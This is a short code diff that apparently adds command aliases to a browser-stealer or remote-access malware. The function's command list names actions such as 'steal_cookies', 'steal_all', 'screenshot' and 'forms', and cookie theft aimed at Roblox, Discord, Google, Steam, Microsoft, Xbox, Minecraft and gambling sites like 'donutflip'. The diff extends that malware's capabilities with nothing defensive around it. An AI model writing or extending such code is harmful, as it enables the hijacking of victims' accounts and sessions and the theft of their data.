@@ -984,7 +984,7 @@ def browser_cmd():
         "cookies_roblox", "cookies_discord", "cookies_google", "cookies_steam",
         "history", "bookmarks", "screenshot", "forms",
         "site_roblox", "site_discord", "site_google", "site_steam",
-        "donutflip", "cookies_donutflip", "df", "donutsurge", "cookies_donutsurge",
+        "donutflip", "cookies_donutflip", "df", "donutsurge", "cookies_donutsurge", "donut_sites", "donutboth", "both_donut", "df_ds",
         "microsoft", "cookies_microsoft", "xbox", "cookies_xbox",
         "minecraft", "minecraft_pack", "steal_all", "hello", "ping",
         "steal_cookies", "all_cookies"
